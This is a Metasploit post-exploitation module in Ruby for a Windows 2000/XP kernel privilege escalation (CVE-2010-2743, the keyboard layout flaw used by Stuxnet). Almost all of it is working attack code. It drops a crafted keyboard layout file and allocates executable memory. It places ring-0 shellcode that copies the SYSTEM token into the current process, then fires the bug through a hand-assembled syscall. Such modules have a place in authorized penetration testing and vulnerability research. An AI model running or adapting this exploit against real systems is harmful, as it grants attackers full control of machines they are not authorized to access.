##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'metasm'


class Metasploit3 < Msf::Post

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Escalate NtUserLoadKeyboardLayoutEx Privilege Escalation',
      'Description'   => %q{
          This module exploits the keyboard layout vulnerability exploited by Stuxnet. When
        processing specially crafted keyboard layout files (DLLs), the Windows kernel fails
        to validate that an array index is within the bounds of the array. By loading
        a specially crafted keyboard layout, an attacker can execute code in Ring 0.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Ruben Santamarta',  # First public exploit
          'jduck'              # Metasploit module
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'References'    =>
        [
          [ 'OSVDB', '68552' ],
          [ 'CVE', '2010-2743' ],
          [ 'MSB', 'MS10-073' ],
          [ 'URL', 'http://www.vupen.com/blog/20101018.Stuxnet_Win32k_Windows_Kernel_0Day_Exploit_CVE-2010-2743.php' ],
          [ 'URL', 'http://www.reversemode.com/index.php?option=com_content&task=view&id=71&Itemid=1' ],
          [ 'EDB', '15985' ]
        ],
      'DisclosureDate'=> "Oct 12 2010"
    ))

  end

  def run
    mem_base = nil
    dllpath = nil
    hDll = false

    vuln = false
    winver = session.sys.config.sysinfo["OS"]
    affected = [ 'Windows 2000', 'Windows XP' ]
    affected.each { |v|
      if winver.include? v
        vuln = true
        break
      end
    }
    if not vuln
      print_error("#{winver} is not vulnerable.")
      return
    end

    # syscalls from http://j00ru.vexillium.org/win32k_syscalls/
    if winver =~ /2000/
      system_pid = 8
      pid_off = 0x9c
      flink_off = 0xa0
      token_off = 0x12c
      addr = 0x41424344
      syscall_stub = <<-EOS
mov eax, 0x000011b6
lea edx, [esp+4]
int 0x2e
ret 0x1c
EOS
    else # XP
      system_pid = 4
      pid_off = 0x84
      flink_off = 0x88
      token_off = 0xc8
      addr = 0x60636261
      syscall_stub = <<-EOS
mov eax, 0x000011c6
mov edx, 0x7ffe0300
call [edx]
ret 0x1c
EOS
    end

    ring0_code =
      #"\xcc" +
      # save registers -- necessary for successfuly recovery
      "\x60" +
      # get EPROCESS from ETHREAD
      "\x64\xa1\x24\x01\x00\x00" +
      "\x8b\x70\x44" +
      # init PID search
      "\x89\xf0" +
      "\xbb" + "FFFF" +
      "\xb9" + "PPPP" +
      # look for the system pid EPROCESS
      "\xba" + "SSSS" +
      "\x8b\x04\x18" +
      "\x29\xd8" +
      "\x39\x14\x08" +
      "\x75\xf6" +
      # save the system token addr in edi
      "\xbb" + "TTTT" +
      "\x8b\x3c\x18" +
      "\x83\xe7\xf8" +
      # re-init the various offsets
      "\x89\xf0"  +
      "\xbb" + "FFFF" +
      "\xb9" + "PPPP" +
      # find the target pid token
      "\xba" + "TPTP" +
      "\x8b\x04\x18" +
      "\x29\xd8" +
      "\x39\x14\x08" +
      "\x75\xf6" +
      # set the target pid's token to the system token
      "\xbb" + "TTTT" +
      "\x89\x3c\x18" +
      # restore start context
      "\x61" +
      # recover in ring0, return to caller
      "\xc2\x0c\00"

    dll_data =
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\xE0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x2E\x64\x61\x74\x61\x00\x00\x00" +
      "\xE6\x00\x00\x00\x60\x01\x00\x00\xE6\x00\x00\x00\x60\x01\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x94\x01\x00\x00\x9E\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\xA6\x01\x00\x00\xAA\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x9C\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x01\x00\x00\x00\xC2\x01\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
      "\x00\x00\x00\x00\x00\x00"

    pid = session.sys.process.getpid
    print_status("Attempting to elevate PID 0x%x" % pid)

    # Prepare the shellcode (replace platform specific stuff, and pid)
    ring0_code.gsub!('FFFF', [flink_off].pack('V'))
    ring0_code.gsub!('PPPP', [pid_off].pack('V'))
    ring0_code.gsub!('SSSS', [system_pid].pack('V'))
    ring0_code.gsub!('TTTT', [token_off].pack('V'))
    ring0_code.gsub!('TPTP', [pid].pack('V'))

    # Create the malicious Keyboard Layout file...
    tmpdir = session.sys.config.getenv('TEMP')
    fname = "p0wns.boom"
    dllpath = "#{tmpdir}\\#{fname}"
    fd = session.fs.file.new(dllpath, 'wb')
    fd.write(dll_data)
    fd.close

    # Can't use this atm, no handle access via stdapi :(
    #dll_fd = session.fs.file.new(dllpath, 'rb')
    # Instead, we'll use railgun to re-open the file
    ret = session.railgun.kernel32.CreateFileA(dllpath, GENERIC_READ, 1, nil, 3, 0, 0)
    print_status(ret.inspect)
    if ret['return'] < 1
      print_error("Unable to open #{dllpath}")
      return
    end
    hDll = ret['return']
    print_status("Wrote malicious keyboard layout to #{dllpath} ..")

    # Allocate some RWX virtual memory for our use..
    mem_base = addr & 0xffff0000
    mem_size = (addr & 0xffff) + 0x1000
    mem_size += (0x1000 - (mem_size % 0x1000))
    mem = session.railgun.kernel32.VirtualAlloc(mem_base, mem_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if (mem['return'] != mem_base)
      print_error("Unable to allocate RWX memory @ 0x%x" % mem_base)
      return
    end
    print_status("Allocated 0x%x bytes of memory @ 0x%x" % [mem_size, mem_base])

    # Initialize the buffer to contain NO-OPs
    nops = "\x90" * mem_size
    ret = session.railgun.memwrite(mem_base, nops, nops.length)
    if not ret
      print_error("Unable to fill memory with NO-OPs")
      return
    end

    # Copy the shellcode to the desired place
    ret = session.railgun.memwrite(addr, ring0_code, ring0_code.length)
    if not ret
      print_error("Unable to copy ring0 payload")
      return
    end

    # InitializeUnicodeStr(&uStr,L"pwn3d.dll"); -- Is this necessary?
    pKLID = mem_base
    pStr = pKLID + (2+2+4)
    kbd_name = "pwn3d.dll"
    uni_name = Rex::Text.to_unicode(kbd_name + "\x00")
    ret = session.railgun.memwrite(pStr, uni_name, uni_name.length)
    if not ret
      print_error("Unable to copy unicode string data")
      return
    end
    unicode_str = [
      kbd_name.length * 2,
      uni_name.length,
      pStr
    ].pack('vvV')
    ret = session.railgun.memwrite(pKLID, unicode_str, unicode_str.length)
    if not ret
      print_error("Unable to copy UNICODE_STRING structure")
      return
    end
    print_status("Initialized RWX buffer ...")

    # Get the current Keyboard Layout
    ret = session.railgun.user32.GetKeyboardLayout(0)
    if ret['return'] < 1
      print_error("Unable to GetKeyboardLayout")
      return
    end
    hKL = ret['return']
    print_status("Current Keyboard Layout: 0x%x" % hKL)

    # _declspec(naked) HKL __stdcall NtUserLoadKeyboardLayoutEx(
    #  IN HANDLE Handle,
    #  IN DWORD offTable,
    #  IN PUNICODE_STRING puszKeyboardName,
    #  IN HKL hKL,
    #  IN PUNICODE_STRING puszKLID,
    #  IN DWORD dwKLID,
    #  IN UINT Flags
    # )

    # Again, railgun/meterpreter doesn't implement calling a non-dll function, so
    # I tried to hack up this call to KiFastSystemCall, but that didn't work either...
=begin
    session.railgun.add_function('ntdll', 'KiFastSystemCall', 'DWORD',
      [
        [ 'DWORD', 'syscall', 'in' ],
        [ 'DWORD', 'handle', 'in' ],
        [ 'DWORD', 'offTable', 'in' ],
        [ 'PBLOB', 'pKbdName', 'in' ],
        [ 'DWORD', 'hKL', 'in' ],
        [ 'PBLOB', 'pKLID', 'in' ],
        [ 'DWORD', 'dwKLID', 'in' ],
        [ 'DWORD', 'Flags', 'in' ]
      ])
    ret = session.railgun.ntdll.KiFastSystemCall(dll_fd, 0x1ae0160, nil, hKL, pKLID, 0x666, 0x101)
    print_status(ret.inspect)
=end

    # Instead, we'll craft a machine code blob to setup the stack and perform
    # the system call..
    asm = <<-EOS
pop esi
push 0x101
push 0x666
push #{"0x%x" % pKLID}
push #{"0x%x" % hKL}
push 0
push 0x1ae0160
push #{"0x%x" % hDll}
push esi
#{syscall_stub}
EOS
    #print_status("\n" + asm)
    bytes = Metasm::Shellcode.assemble(Metasm::Ia32.new, asm).encode_string
    #print_status("\n" + Rex::Text.to_hex_dump(bytes))

    # Copy this new system call wrapper function into our RWX memory
    func_ptr = mem_base + 0x1000
    ret = session.railgun.memwrite(func_ptr, bytes, bytes.length)
    if not ret
      print_error('Unable to copy system call stub')
      return
    end
    print_status("Patched in syscall wrapper @ 0x%x" % func_ptr)

    # GO GO GO
    ret = session.railgun.kernel32.CreateThread(nil, 0, func_ptr, nil, "CREATE_SUSPENDED", nil)
    if ret['return'] < 1
      print_error("Unable to CreateThread")
      return
    end
    hthread = ret['return']

    # Resume the thread to actually have the syscall happen
    ret = client.railgun.kernel32.ResumeThread(hthread)
    if ret['return'] < 1
      print_error("Unable to ResumeThread")
      return
    end
    print_status("Successfully executed syscall wrapper!")

    # Now, send some input to cause ring0 payload execution...
    print_status("Attempting to cause the ring0 payload to execute...");
    vInput = [
      1,    # INPUT_KEYBOARD - input type
      # KEYBDINPUT struct
      0x0,  # wVk
      0x0,  # wScan
      0x0,  # dwFlags
      0x0,  # time
      0x0,  # dwExtraInfo
      0x0,  # pad 1
      0x0   # pad 2
    ].pack('VvvVVVVV')
    ret = session.railgun.user32.SendInput(1, vInput, vInput.length)
    print_status('SendInput: ' + ret.inspect)

  ensure
    # Clean up
    if mem_base
      ret = session.railgun.kernel32.VirtualFree(mem_base, 0, MEM_RELEASE)
      if not ret['return']
        print_error("Unable to free memory @ 0x%x" % mem_base)
      end
    end

    #dll_fd.close
    if hDll
      ret = session.railgun.kernel32.CloseHandle(hDll)
      if not ret['return']
        print_error("Unable to CloseHandle")
      end
    end

    session.fs.file.rm(dllpath) if dllpath

  end


end
